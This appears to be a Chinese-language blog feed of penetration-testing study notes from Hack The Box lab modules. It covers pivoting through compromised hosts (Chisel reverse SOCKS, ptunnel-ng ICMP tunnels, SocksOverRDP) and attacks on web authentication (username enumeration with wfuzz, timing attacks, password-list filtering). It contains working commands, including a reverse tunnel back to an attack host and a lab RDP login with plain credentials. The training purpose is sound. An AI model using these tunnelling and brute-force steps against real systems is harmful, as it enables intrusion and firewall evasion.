Pivot</h2><p>在前面的例子中，我们使用受损的机器（Ubuntu）作为Chisel服务器，在端口1234上列出。尽管如此，在某些情况下，防火墙规则可能会限制与受损目标的入站连接。在这种情况下，我们可以将Chisel与反向选项一起使用。 当Chisel服务器启用了–reverse时，remotes可以加上前缀R来表示reverse。服务器将侦听并接受连接，并且它们将通过指定远程的客户端进行代理。指定R:socks的反向远程将侦听服务器的默认socks端口（1080），并终止客户端内部SOCKS5代理的连接。 我们将使用选项–reverse在攻击主机中启动服务器。</p><h4 id="Starting-the-Chisel-Server-on-our-Attack-Host"><a href="#Starting-the-Chisel-Server-on-our-Attack-Host" class="headerlink" title="Starting the Chisel Server on our Attack Host"></a>Starting the Chisel Server on our Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks52022/05/30 10:19:16 server: Reverse tunnelling enabled2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234</code></pre><p>我们可以使用任何编辑器来编辑proxyains.conf文件，然后使用tail确认我们的配置更改。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf [ProxyList]# add proxy here ...# socks4    127.0.0.1 9050socks5 127.0.0.1 1080 </code></pre><pre><code class="shell-session">ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:12342022/05/30 14:19:29 client: Handshaking...2022/05/30 14:19:30 client: Sending config2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)2022/05/30 14:19:30 client: tun: SSH connected</code></pre><p>如果我们将proxychains与RDP一起使用，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h1 id="ICMP-Tunneling-with-SOCKS"><a href="#ICMP-Tunneling-with-SOCKS" class="headerlink" title="ICMP Tunneling with SOCKS"></a>ICMP Tunneling with SOCKS</h1><p>ICMP隧道将您的流量封装在包含回显请求和响应的ICMP数据包中。ICMP隧道只有在防火墙网络中允许ping响应时才能工作。当防火墙网络中的主机被允许对外部服务器进行ping时，它可以将其流量封装在ping回显请求中，并将其发送到外部服务器。外部服务器可以验证此流量并发送适当的响应，这对于数据泄露和创建到外部服务器的数据透视隧道非常有用。 我们将使用ptunnel ng工具在Ubuntu服务器和攻击主机之间创建一个隧道。一旦创建了隧道，我们将能够通过 <a href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> 客户端代理我们的流量。我们可以在目标pivot主机上启动ptunnel ng服务器。让我们从设置ptunnel ng开始。</p><h2 id="Setting-Up-amp-Using-ptunnel-ng"><a href="#Setting-Up-amp-Using-ptunnel-ng" class="headerlink" title="Setting Up &amp; Using ptunnel-ng"></a>Setting Up &amp; Using ptunnel-ng</h2><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git</code></pre><h4 id="Building-Ptunnel-ng-with-Autogen-sh"><a href="#Building-Ptunnel-ng-with-Autogen-sh" class="headerlink" title="Building Ptunnel-ng with Autogen.sh"></a>Building Ptunnel-ng with Autogen.sh</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./autogen.sh </code></pre><p>在运行autogen.sh之后，可以从客户端和服务器端使用ptunnel ng。我们现在需要将回购从我们的攻击主机转移到目标主机。如前几节所述，我们可以使用SCP来传输文件。如果我们想传输整个repo和其中包含的文件，我们需要将-r选项与SCP一起使用。 将Ptunnel ng传输到数据透视主机</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/</code></pre><h4 id="Starting-the-ptunnel-ng-Server-on-the-Target-Host"><a href="#Starting-the-ptunnel-ng-Server-on-the-Target-Host" class="headerlink" title="Starting the ptunnel-ng Server on the Target Host"></a>Starting the ptunnel-ng Server on the Target Host</h4><pre><code class="shell-session">ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22[sudo] password for ubuntu: ./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Forwarding incoming ping packets over TCP.[inf]: Ping proxy is listening in privileged mode.[inf]: Dropping privileges now.</code></pre><p>-r后面的IP地址应该是我们希望ptunnel ng接受连接的IP。在这种情况下，我们将使用从我们的攻击主机可以访问的任何IP。在实际参与过程中使用同样的想法和考虑会使我们受益。 回到攻击主机上，我们可以尝试连接到ptunnel ng服务器（-p＜ipAddress-Target＞），但要确保通过本地端口2222（-l2222）进行连接。通过本地端口2222连接允许我们通过ICMP隧道发送流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Relaying packets from incoming TCP streams.</code></pre><p>随着ptunnel ng ICMP隧道的成功建立，我们可以尝试通过本地端口2222（-p2222）使用SSH连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1</code></pre><p>如果配置正确，我们将能够通过ICMP隧道输入凭据并进行SSH会话。 在连接的客户端和服务器端，我们会注意到ptunnel ng为我们提供了与通过ICMP隧道的流量相关的会话日志和流量统计信息。这是我们可以使用ICMP确认流量从客户端传递到服务器的一种方式。</p><h4 id="Enabling-Dynamic-Port-Forwarding-over-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-over-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding over SSH"></a>Enabling Dynamic Port Forwarding over SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1ubuntu@127.0.0.1&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)&lt;snip&gt;</code></pre><p>我们可以使用带有Nmap的proxychains扫描内部网络上的目标（172.16.5.x）。根据我们的发现，我们可以尝试连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389</code></pre><h2 id="Network-Traffic-Analysis-Considerations"><a href="#Network-Traffic-Analysis-Considerations" class="headerlink" title="Network Traffic Analysis Considerations"></a>Network Traffic Analysis Considerations</h2><p>重要的是，我们要确认我们正在使用的工具是否如广告所示，并且我们已经设置并正确操作了它们。在使用ICMP隧道通过本节中教导的不同协议对流量进行隧道传输的情况下，我们可以从使用Wireshark等数据包分析器分析生成的流量中受益。仔细看一下下面的短片。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041725504.gif" alt="img"></p><p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;">&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p><h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。<a href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a>是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具 <a href="https://www.proxifier.com/">Proxifier</a>作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p><p> <a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a>二进制文件</p><p><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p><p> 我们可以查找ProxifierPE.zip 然后，我们可以使用xfreerdp连接到目标，并将SocksOverRDP64.zip文件复制到目标。然后，我们需要从Windows目标加载使用regsvr32.exe的SocksOverRDP.dll。</p><h4 id="Loading-SocksOverRDP-dll-using-regsvr32-exe"><a href="#Loading-SocksOverRDP-dll-using-regsvr32-exe" class="headerlink" title="Loading SocksOverRDP.dll using regsvr32.exe"></a>Loading SocksOverRDP.dll using regsvr32.exe</h4><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll</code></pre><p>现在，我们可以使用mstsc.exe通过RDP连接到172.16.5.19，我们应该会收到一个提示，即SocksOverRDP插件已启用，它将在127.0.0.1:1080上侦听。我们可以使用胜利者的凭据：pass@123连接到172.16.5.19。</p><p>我们需要将SocksOverRDP64.zip或仅将SocksOverRDP-Server.exe传输到172.16.5.19。然后，我们可以使用管理员权限启动SocksOverRDP-Server.exe。</p><p>当我们回到我们的立足点目标并查看Netstat时，我们应该会看到我们的SOCKS侦听器在127.0.0.1:1080。</p><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; netstat -antb | findstr 1080  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING</code></pre><p>启动我们的侦听器后，我们可以将Proxizer便携式传输到Windows 10目标（在10.129.x.x网络上），并将其配置为将我们的所有数据包转发到127.0.0.1:1080。Proxifier将通过给定的主机和端口路由流量。有关配置Proxifier的快速演练，请参阅下面的片段。</p><h4 id="Configuring-Proxifier"><a href="#Configuring-Proxifier" class="headerlink" title="Configuring Proxifier"></a>Configuring Proxifier</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041754536.gif" alt="img"></p><p>配置并运行Proxizer后，我们可以启动mstsc.exe，它将使用Proxizer通过127.0.0.1:1080将我们的所有流量进行枢轴传输，这将通过RDP将其传输到172.16.5.19，然后通过SocksOverRDP-server.exe将其路由到172.16.6.155。</p><h4 id="RDP-Performance-Considerations"><a href="#RDP-Performance-Considerations" class="headerlink" title="RDP Performance Considerations"></a>RDP Performance Considerations</h4><p>当在约定中与RDP会话交互时，我们可能会发现自己在给定会话中遇到性能缓慢的问题，尤其是当我们同时管理多个RDP会话时。如果是这种情况，我们可以访问mstsc.exe中的“体验”选项卡，并将“性能”设置为“调制解调器”。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041755688.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSH-for-Windows-plink-exe&quot;&gt;&lt;a href=&quot;#SSH-for-Windows-plink-exe&quot; class=&quot;headerlink&quot; title=&quot;SSH for Windows: plink.exe&quot;&gt;&lt;/a&gt;SSH for Wi</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Broken Authentication</title>
    <link href="https://taninluv.github.io/2023/09/01/Broken-Authentication/"/>
    <id>https://taninluv.github.io/2023/09/01/Broken-Authentication/</id>
    <published>2023-09-01T08:08:19.000Z</published>
    <updated>2023-09-06T03:17:22.996Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Overview-of-Attacks-Against-Authentication"><a href="#Overview-of-Attacks-Against-Authentication" class="headerlink" title="Overview of Attacks Against Authentication"></a>Overview of Attacks Against Authentication</h1><p>身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： <strong>HAS域（拥有的东西）</strong> <strong>IS域（所知信息）</strong> <strong>KNOWS域（所知的事情）</strong></p><span id="more"></span><h2 id="Attacking-the-HAS-Domain"><a href="#Attacking-the-HAS-Domain" class="headerlink" title="Attacking the HAS Domain"></a>Attacking the HAS Domain</h2><p>谈到在涵盖Multi-Factor Authentication时描述的三个域，has域看起来很简单，因为我们要么拥有硬件令牌，要么没有。然而，事情比表面上看起来更复杂： 徽章可以在不被接管的情况下被克隆 用于生成一次性密码的加密算法可能会被破坏 任何物理设备都可能被盗 远程天线可以轻松实现50厘米的工作距离，并复制经典的NFC徽章。你可能认为攻击者必须非常靠近受害者才能成功地执行这样的攻击。想想在使用公共交通工具或在商店排队等候时，我们坐得有多近，你可能会改变主意。每天都有多个人可以进行这样的克隆攻击。 想象一下，你正在办公室附近的酒吧吃快餐。你甚至没有注意到有袭击者从你的座位旁走过，因为你正忙于一项紧急的工作任务。他们刚刚克隆了你口袋里的徽章！！！几分钟后，他们将您的徽章信息转移到一个干净的代币中，并在吃午饭时使用它进入您公司的大楼。 很明显，克隆企业徽章并没有那么困难，而且后果可能很严重。</p><h2 id="Attacking-the-IS-Domain"><a href="#Attacking-the-IS-Domain" class="headerlink" title="Attacking the IS Domain"></a>Attacking the IS Domain</h2><p>你可能会认为is域是最难攻击的。如果一个人依靠“某物”来证明自己的身份，而这个“某物”被破坏了，他们就会失去证明自己身份的独特方式，因为没有人可以改变他们的身份。视网膜扫描、指纹读取器、面部识别都被证明是可以破解的。所有这些都可以通过第三方泄露、高清图片、吝啬鬼，甚至是偷对玻璃的邪恶女仆来破解。 销售基于is域的安全措施的公司表示，它们非常安全。2019年8月，一家制造通过移动或网络应用程序管理的生物识别智能锁的公司被攻破。该公司使用指纹或面部识别来识别授权用户。该漏洞暴露了所有指纹和面部模式，包括用户名和密码、授权和注册用户的地址。虽然用户可以轻松更改密码并减轻问题，但任何能够复制指纹或面部图案的人仍然可以解锁和管理这些智能锁。</p><h2 id="Attacking-the-KNOWS-Domain"><a href="#Attacking-the-KNOWS-Domain" class="headerlink" title="Attacking the KNOWS Domain"></a>Attacking the KNOWS Domain</h2><p>knows领域是我们将在本模块中深入研究的领域。这是最简单的理解，但我们应该深入了解每一个方面，因为它也是最广泛的。这个域指的是用户知道的东西，比如用户名或密码。在本模块中，我们将仅针对FBA进行工作。请记住，同样的方法也可以适用于HTTP身份验证实现。</p><h1 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h1><p> <a href="https://www.cirt.net/passwords">web database</a></p><h1 id="Weak-Bruteforce-Protections"><a href="#Weak-Bruteforce-Protections" class="headerlink" title="Weak Bruteforce Protections"></a>Weak Bruteforce Protections</h1><p>在深入研究攻击之前，我们必须了解在测试过程中可能遇到的保护措施。如今，有许多不同的安全机制旨在防止自动攻击。最常见的有以下几种。</p><ul><li><code>CAPTCHA</code></li><li><code>Rate Limits</code></li></ul><p> 此外，web开发人员经常创建自己的安全机制，使测试过程对我们来说更“有趣”，因为这些自定义安全机制可能包含我们可以利用的漏洞。让我们首先熟悉针对自动攻击的常见安全机制，以了解它们的功能，并为针对它们的攻击做好准备。</p><h2 id="CAPTCHA"><a href="#CAPTCHA" class="headerlink" title="CAPTCHA"></a>CAPTCHA</h2><p><a href="https://en.wikipedia.org/wiki/CAPTCHA">CAPTCHA</a></p><p>一种广泛使用的安全措施，以“告诉计算机和人类分开的全自动公共图灵测试”这句话命名，可以有很多不同的形式。例如，它可能需要键入图像上的单词，听到一个简短的音频样本并将你听到的内容输入到表格中，将图像与给定的模式匹配，或者执行基本的数学运算。</p><p>尽管CAPTCHA在过去已经被成功绕过，但它对自动攻击仍然非常有效。应用程序至少应该要求用户在几次尝试失败后解决CAPTCHA问题。一些开发人员经常完全跳过这种保护，而另一些开发人员则更喜欢在登录失败后提供CAPTCHA，以保持良好的用户体验。 开发人员也可以使用CAPTCHA的自定义或弱实现，例如，图像的名称由图像中包含的字符组成。保护不力往往比没有保护更糟糕，因为它提供了一种虚假的安全感。下图显示了一个弱实现，PHP代码将图像的内容放入id字段。这种类型的弱实现是罕见的，但并非不可能。</p><p><img src="https://academy.hackthebox.com/storage/modules/80/06-captcha_id.png" alt="img"></p><p>作为攻击者，我们只需读取页面的源代码即可找到CAPTCHA代码的值并绕过保护。我们应该始终阅读源代码。 作为开发人员，我们不应该开发自己的CAPTCHA，而应该依赖一个经过良好测试的CAPTCHA，并在很少失败登录后需要它。</p><h2 id="Rate-Limiting"><a href="#Rate-Limiting" class="headerlink" title="Rate Limiting"></a>Rate Limiting</h2><h2 id="Insufficient-Protections"><a href="#Insufficient-Protections" class="headerlink" title="Insufficient Protections"></a>Insufficient Protections</h2><p>当攻击者可以篡改为提高安全性而考虑的数据时，他们可以绕过所有或部分保护。例如，更改用户代理标头很容易。一些web应用程序或web应用程序防火墙利用X-Forwarded-For等标头来猜测实际的源IP地址。这样做是因为许多互联网提供商、移动运营商或大公司通常将用户“隐藏”在NAT后面。在没有X-Forwarded-For等标头帮助的情况下阻止IP地址可能会导致阻止特定NAT后面的所有用户。</p><h1 id="Brute-Forcing-Usernames"><a href="#Brute-Forcing-Usernames" class="headerlink" title="Brute Forcing Usernames"></a>Brute Forcing Usernames</h1><p>用户名枚举经常被忽视，可能是因为人们认为用户名不是私人信息。当你给另一个用户写消息时，我们通常认为我们知道他们的用户名、电子邮件地址等。同一个用户名经常被重复用于访问其他服务，如FTP、RDP和SSH等。由于许多web应用程序允许我们识别用户名，我们应该利用这一功能，并将其用于以后的攻击。</p><p>广泛的web应用程序都存在此漏洞。 用户名通常远没有密码复杂。当它们不是电子邮件地址时，很少包含特殊字符。拥有一个常见用户列表会给攻击者带来一些优势。除了获得良好的用户体验（UX）外，遇到随机或不易预测的用户名也很少见。用户将比计算机生成的（伪）随机用户名更容易记住他们的电子邮件地址或昵称。 拥有有效用户名列表，攻击者可以缩小暴力攻击的范围，或对支持员工或用户本身进行有针对性的攻击（利用OSINT）。此外，一个通用密码可以很容易地被喷到有效的帐户上，通常会导致成功的帐户泄露。 应该注意的是，用户名也可以通过抓取网络应用程序或使用公共信息来获取，例如社交网络上的公司简介。 防止用户名枚举攻击可能会影响用户体验。网络应用程序显示用户名是否存在可能有助于合法用户识别他们未能正确键入用户名，但这同样适用于试图确定有效用户名的攻击者。即使是像WordPress这样知名且成熟的web框架，也会受到用户枚举的影响，因为开发团队选择通过降低框架的安全级别来获得更流畅的用户体验。</p><h2 id="User-Unknown-Attack"><a href="#User-Unknown-Attack" class="headerlink" title="User Unknown Attack"></a>User Unknown Attack</h2><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d &quot;Username=FUZZ&amp;Password=dummypass&quot; --hs &quot;Unknown username&quot; http://brokenauthentication.hackthebox.eu/user_unknown.php</code></pre><h2 id="Username-Existence-Inference"><a href="#Username-Existence-Inference" class="headerlink" title="Username Existence Inference"></a>Username Existence Inference</h2><p>有时，web应用程序可能不会明确声明它不知道特定的用户名，但允许攻击者推断这条信息。如果用户名有效且已知，则某些web应用程序会预先填充用户名输入值，但如果用户名未知，则保留输入值为空或使用默认值。这在移动版本的网站上很常见，我们之前看到的易受攻击的WordPress登录页面也是如此。在开发过程中，始终尝试为失败登录和授权登录提供相同的体验：即使是微小的差异也足以推断出一条信息。</p><p>虽然不常见，但当用户名有效或无效时，也可能设置不同的cookie。例如，要使用客户端控件检查密码尝试，web应用程序可以设置一个名为“failed_login”的cookie，然后仅在用户名有效时检查该cookie。仔细检查响应，注意HTTP头和HTML源代码中的差异。</p><h2 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h2><p>某些身份验证功能在设计上可能存在缺陷。一个示例是身份验证函数，其中按顺序检查用户名和密码。让我们分析一下下面的程序。</p><pre><code class="php">&lt;?php// connect to database$db = mysqli_connect(&quot;localhost&quot;, &quot;dbuser&quot;, &quot;dbpass&quot;, &quot;dbname&quot;);// retrieve row data for user$result = $db-&gt;query(&#39;SELECT * FROM users WHERE username=&quot;&#39;.safesql($_POST[&#39;user&#39;]).&#39;&quot; AND active=1&#39;);// $db-&gt;query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)if ($result) &#123;  // retrieve a row. don&#39;t use this code if multiple rows are expected  $row = mysqli_fetch_row($result);  // hash password using custom algorithm  $cpass = hash_password($_POST[&#39;password&#39;]);    // check if received password matches with one stored in the database  if ($cpass === $row[&#39;cpassword&#39;]) &#123;    echo &quot;Welcome $row[&#39;username&#39;]&quot;;  &#125; else &#123;    echo &quot;Invalid credentials.&quot;;  &#125; &#125; else &#123;  echo &quot;Invalid credentials.&quot;;&#125;?&gt;</code></pre><p>代码片段首先连接到数据库，然后执行查询以检索用户名与请求的用户名匹配的整行。如果没有结果，函数将以一条通用消息结束。当$result为true（用户存在并且处于活动状态）时，将对提供的密码进行散列和比较。如果使用的哈希算法足够强大，那么两个分支之间的时序差异将是显而易见的。通过使用通用hash_password（）函数计算$cpass，&#x3D;&#x3D;响应时间将高于其他情况&#x3D;&#x3D;。这个小错误可以通过在同一步骤中检查用户和密码来避免，有效用户名和无效用户名的时间相似。 下载脚本 <a href="https://academy.hackthebox.com/storage/modules/80/scripts/timing_py.txt">timing.py</a>来见证这些类型的时间差异，并针对使用bcrypt的示例web应用程序（timing.php）运行它。</p><h4 id="Timing-Attack-Timing-py"><a href="#Timing-Attack-Timing-py" class="headerlink" title="Timing Attack - Timing.py"></a>Timing Attack - Timing.py</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt</code></pre><p>考虑到可能存在网络故障，很容易将“admin”识别为有效用户，因为它比其他测试用户花费了更多的时间。如果使用的算法很快，则时差会更小，攻击者可能会因为网络延迟或CPU负载而产生误报。然而，通过重复大量创建模型的请求，攻击仍然是可能的。虽然我们可以假设现代应用程序使用稳健的算法对密码进行散列，以使潜在的离线暴力攻击尽可能慢，但即使使用MD5或SHA1等快速算法，也可以推断信息。 当领英的用户群在2012年被泄露时，InfoSec的专业人士就SHA1被用作用户密码的哈希算法展开了一场辩论。虽然SHA1在那些日子里没有崩溃，但它被认为是一个不安全的哈希解决方案。Infosec的专业人士开始争论是否选择使用SHA1，而不是更强大的哈希算法，如scrypt、bcrypt或PBKDF（或argon2）。 虽然使用更健壮的算法总是比使用较弱的算法更可取，但架构工程师也应该记住计算成本。这个非常基本的Python脚本有助于阐明这个问题：</p><pre><code class="python">import scryptimport bcryptimport datetimeimport hashlibrounds = 100salt = bcrypt.gensalt()t0 = datetime.datetime.now()for x in range(rounds):    scrypt.hash(str(x).encode(), salt)t1 = datetime.datetime.now()for x in range(rounds):    hashlib.sha1(str(x).encode())t2 = datetime.datetime.now()for x in range(rounds):    bcrypt.hashpw(str(x).encode(), salt)t3 = datetime.datetime.now()print(&quot;sha1:   &#123;&#125;\nscrypt: &#123;&#125;\nbcrypt: &#123;&#125;&quot;.format(t2-t1,t1-t0,t3-t2))</code></pre><p>使用更稳健的算法，这会增加CPU时间和RAM使用量。core第八代i5上运行上面的脚本会得到以下结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 hashtime.pysha1:   0:00:00.000082scrypt: 0:00:03.907575bcrypt: 0:00:22.660548</code></pre><p>让我们通过一个粗略的例子来添加一些上下文： 领英每天有约2亿用户，这意味着每秒约有24次登录（我们不排除拥有“记住我”代币的用户）。 如果他们使用像bcrypt这样的强大算法，在我们的测试机器上每轮使用0.23秒，他们将需要六台服务器才能让人们登录。对于一家运行数千台服务器的公司来说，这听起来不是什么大问题，但这需要对架构进行彻底改革。</p><h2 id="Enumerate-through-Password-Reset"><a href="#Enumerate-through-Password-Reset" class="headerlink" title="Enumerate through Password Reset"></a>Enumerate through Password Reset</h2><p>重置表单的保护通常不如登录表单好。因此，他们经常泄露有关有效或无效用户名的信息。正如我们已经讨论过的，当找到有效的用户名时，应用程序会回复“您应该很快收到一条消息”，而“用户名未知，请检查您的数据”则会泄露注册用户的存在。 这种攻击很吵，因为一些有效用户可能会收到要求重置密码的电子邮件。也就是说，这些电子邮件经常得不到最终用户的适当关注。</p><h2 id="Enumerate-through-Registration-Form"><a href="#Enumerate-through-Registration-Form" class="headerlink" title="Enumerate through Registration Form"></a>Enumerate through Registration Form</h2><p>默认情况下，当所选用户名已经存在时，提示用户选择用户名的注册表单通常会回复一条明确的消息，或者在这种情况下提供其他“告诉”。通过滥用这种行为，攻击者可以注册常见的用户名，如admin、administrator、tech，以枚举有效的用户名。在检查所选用户名（如CAPTCHA）是否存在之前，安全注册表应该实现一些保护。 在测试时，许多人不知道或没有准备好电子邮件地址的一个有趣功能是子寻址。这个在RFC5233中定义的扩展表示，邮件传输代理（MTA）应该忽略电子邮件地址左侧的任何+标记，并将其用作筛选过滤器的标记。这意味着写信给学生这样的电子邮件地址<a href="mailto:&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;">&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;</a>将电子邮件发送到<a href="mailto:&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;">&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;</a>并且，如果支持并正确配置了过滤器，则会将其放置在文件夹htb中。很少有网络应用程序尊重这个RFC，这导致了通过使用一个标签和一个实际的电子邮件地址来注册几乎无限用户的可能性。</p><h2 id="Predictable-Usernames"><a href="#Predictable-Usernames" class="headerlink" title="Predictable Usernames"></a>Predictable Usernames</h2><p>在用户体验需求较少的网络应用程序中，例如家庭银行，或者需要批量创建多个用户时，我们可能会看到按顺序创建的用户名。 虽然不常见，但您可能会遇到像user1000、user1001这样的帐户。“管理”用户也可能有一个可预测的命名约定，如support.It、support.fr或类似的。攻击者可以推断用于创建用户的算法（增量四位数、国家代码等），并从一些已知的用户帐户开始猜测现有用户帐户。</p><h1 id="Brute-Forcing-Passwords"><a href="#Brute-Forcing-Passwords" class="headerlink" title="Brute Forcing Passwords"></a>Brute Forcing Passwords</h1><h2 id="Password-Issues"><a href="#Password-Issues" class="headerlink" title="Password Issues"></a>Password Issues</h2><p>从历史上看，密码有三个重要问题。第一个问题在于名称本身。很多时候，用户认为密码可以只是一个单词，而不是一个短语。第二个问题是，用户大多设置了易于记住的密码。这样的密码通常很弱，或者遵循可预测的模式。即使用户选择了一个更复杂的密码，它通常也会写在便利贴上或保存在明文中。在提示字段中写入密码的情况也并不少见。当访问企业网络的频繁密码轮换要求开始发挥作用时，第二个密码问题会变得更糟。这一要求通常会导致诸如Spring2020、Autumn2020或CompanynameTown1、CompanynameTown2等密码。 最近，美国国家标准与技术研究院更新了其关于密码策略测试、密码年龄要求和密码组成规则的指导方针。</p><p>最后，众所周知，许多用户在多个服务上重复使用相同的密码。其中一个密码泄露或泄露会让攻击者访问广泛的网站或应用程序。这种攻击被称为凭据填充，与Hashcat破解密码模块中教授的单词列表生成密切相关。存储和使用复杂密码的可行解决方案是密码管理器。有时您可能会遇到弱密码要求。这种情况通常发生在有额外安全措施的情况下。ATM就是一个很好的例子。密码，或者更好的是PIN，只是一个4或5位数字的序列。相当弱，但缺乏复杂性，但总尝试次数有限（在失去对设备的物理访问之前，不超过3个PIN）。</p><p>现在让我们假设这个web应用程序需要一个介于8到12个字符之间的字符串，其中至少有一个大写和小写字符。我们现在使用一个巨大的单词列表，只提取符合此策略的密码。Unix grep不是速度最快的工具，但它允许我们使用POSIX正则表达式快速完成这项工作。下面的命令将针对rockyou-50.txt，这是SecLists中常见的rockyou密码泄漏的子集。此命令使用扩展正则表达式（-E）查找至少有一个大写字符（“[：upper：]]”）的行，然后仅查找同时有一个小写字符（“[[：lower：]]’”）并且长度为8和12个字符（“^.｛8,12｝$”）的线。</p><pre><code class="shell-session">Tanin@htb[/htb]$ grep &#39;[[:upper:]]&#39; rockyou.txt | grep &#39;[[:lower:]]&#39; | grep -E &#39;^.&#123;8,12&#125;$&#39;</code></pre><h1 id="Predictable-Reset-Token"><a href="#Predictable-Reset-Token" class="headerlink" title="Predictable Reset Token"></a>Predictable Reset Token</h1><p>重置令牌（以代码或临时密码的形式）是主要由应用程序在请求重置密码时生成的秘密数据。在实际更改凭据之前，用户必须提供它来证明自己的身份。有时，应用程序要求您选择一个或多个安全问题，并在注册时提供答案。如果您忘记了密码，您可以通过再次回答这些问题来重置密码。我们也可以将这些答案视为象征。 